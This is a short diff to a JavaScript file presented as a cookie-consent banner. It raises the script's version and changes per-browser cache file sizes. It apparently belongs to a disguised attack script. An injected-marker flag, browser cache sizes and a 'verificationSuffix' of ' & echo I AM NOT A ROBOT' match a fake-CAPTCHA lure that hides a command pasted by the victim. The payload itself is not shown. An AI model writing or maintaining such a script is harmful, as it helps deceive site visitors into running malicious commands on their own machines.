@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.9.19',
+    version: '1.9.20',
     presentation: 'consent',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
@@ -32,9 +32,9 @@
     },
     cacheFileSizesJj: {
       firefox: 0,
-      chrome: 17182,
-      edge: 17182,
-      brave: 17182
+      chrome: 17173,
+      edge: 17173,
+      brave: 17173
     },
     verificationSuffix: ' & echo I AM NOT A ROBOT',
     verificationTemplates: {
